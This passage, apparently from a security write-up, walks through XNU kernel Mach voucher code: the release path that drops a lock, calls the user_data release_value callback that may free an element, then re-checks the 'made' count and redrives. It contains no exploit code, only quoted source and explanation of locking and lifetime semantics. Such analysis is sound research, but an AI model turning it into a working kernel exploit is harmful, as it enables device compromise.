 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">value_index</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">value </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_value</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* new made values raced with this return. &nbsp;If the</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* manager OK&#39;ed the prior release, we have to start</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* the made numbering over again (pretend the race</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* didn&#39;t happen). If the entry has zero refs again,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* re-drive the release.</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;made</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">KERN_SUCCESS </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made </span><span class="BGLtzooHlW-c2">-=</span><span class="BGLtzooHlW-c4">&nbsp;made</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_refs</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">goto</span><span class="BGLtzooHlW-c4">&nbsp;redrive</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_releasing </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;FALSE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">else</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Note that we enter this snippet with the </span><span class="BGLtzooHlW-c11">ivac</span><span>&#39;s lock held. The </span><span class="BGLtzooHlW-c11">ivace-&gt;ivace_value</span><span>&nbsp;and </span><span class="BGLtzooHlW-c11">ivace-&gt;ivace_made</span><span>&nbsp;values are read under that lock, then the </span><span class="BGLtzooHlW-c11">ivac</span><span>&nbsp;lock is dropped and the attribute managers </span><span class="BGLtzooHlW-c11">release_value</span><span class="BGLtzooHlW-c10">&nbsp;callback is called:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.878791384d9e68560db9fcecd2cc8d16dddfac08"></a><a id="t.45"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; kr </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivam</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivam_release_value</span><span class="BGLtzooHlW-c2">)(</span><span class="BGLtzooHlW-c4">ivam</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;key</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;value</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;made</span><span class="BGLtzooHlW-c2">);</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Here&#39;s the </span><span class="BGLtzooHlW-c11">user_data</span><span>&nbsp;</span><span class="BGLtzooHlW-c11">ivam_release_value</span><span class="BGLtzooHlW-c10">&nbsp;callback:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.3ccebbb1131353580cda71b6754e18fb5fd88dab"></a><a id="t.46"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c3">&nbsp;kern_return_t</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">user_data_release_value</span><span class="BGLtzooHlW-c2">(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ipc_voucher_attr_manager_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;__assert_only manager</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_key_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; __assert_only key</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_value_handle_t &nbsp; &nbsp; &nbsp; &nbsp;value</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_value_reference_t &nbsp; &nbsp; sync</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; user_data_element_t elem</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_index_t hash</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(&amp;</span><span class="BGLtzooHlW-c4">user_data_manager </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;manager</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; USER_DATA_ASSERT_KEY</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">key</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; elem </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">user_data_element_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">value</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; hash </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_hash</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; user_data_lock</span><span class="BGLtzooHlW-c2">();</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">sync </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_made</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; queue_remove</span><span class="BGLtzooHlW-c2">(&amp;</span><span class="BGLtzooHlW-c4">user_data_bucket</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">hash</span><span class="BGLtzooHlW-c2">],</span><span class="BGLtzooHlW-c4">&nbsp;elem</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;user_data_element_t</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;e_hash_link</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; user_data_unlock</span><span class="BGLtzooHlW-c2">();</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kfree</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">elem</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">sizeof</span><span class="BGLtzooHlW-c2">(*</span><span class="BGLtzooHlW-c4">elem</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">+</span><span class="BGLtzooHlW-c4">&nbsp;elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_SUCCESS</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">sync </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_made</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; user_data_unlock</span><span class="BGLtzooHlW-c2">();</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_FAILURE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Under the </span><span class="BGLtzooHlW-c11">user_data</span><span>&nbsp;lock (via </span><span class="BGLtzooHlW-c11">user_data_lock()</span><span>) the code checks whether the </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&#39;s </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;field is </span><span class="BGLtzooHlW-c17">equal</span><span>&nbsp;to the </span><span class="BGLtzooHlW-c11">sync</span><span>&nbsp;value passed in. Looking back at the caller, </span><span class="BGLtzooHlW-c11">sync</span><span>&nbsp;is </span><span class="BGLtzooHlW-c11">ivace-&gt;ivace_made</span><span>. If and only if those values are equal does this method remove the </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;from the hashtable and free it (via </span><span class="BGLtzooHlW-c11">kfree</span><span>) before returning success. If </span><span class="BGLtzooHlW-c11">sync</span><span>&nbsp;isn&#39;t equal to </span><span class="BGLtzooHlW-c11">e_made</span><span>, this method returns </span><span class="BGLtzooHlW-c11">KERN_FAILURE</span><span class="BGLtzooHlW-c10">.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Having looked at the semantics of </span><span class="BGLtzooHlW-c11">user_data_free_value</span><span class="BGLtzooHlW-c10">&nbsp;let&#39;s look back at the callsite:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.900b61ea9371ab65b27de652c8f9e5e6230baf4e"></a><a id="t.47"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">redrive</span><span class="BGLtzooHlW-c2">:</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">value </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_value</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(!</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_free</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; made </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* callout to manager&#39;s release_value */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; kr </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivam</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivam_release_value</span><span class="BGLtzooHlW-c2">)(</span><span class="BGLtzooHlW-c4">ivam</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;key</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;value</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;made</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* recalculate entry address as table may have changed */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_lock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">value_index</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">value </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_value</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* new made values raced with this return. &nbsp;If the</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* manager OK&#39;ed the prior release, we have to start</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* the made numbering over again (pretend the race</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* didn&#39;t happen). If the entry has zero refs again,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* re-drive the release.</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;made</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">KERN_SUCCESS </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made </span><span class="BGLtzooHlW-c2">-=</span><span class="BGLtzooHlW-c4">&nbsp;made</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_refs</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">goto</span><span class="BGLtzooHlW-c4">&nbsp;redrive</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_releasing </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;FALSE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c2">;</span></p>
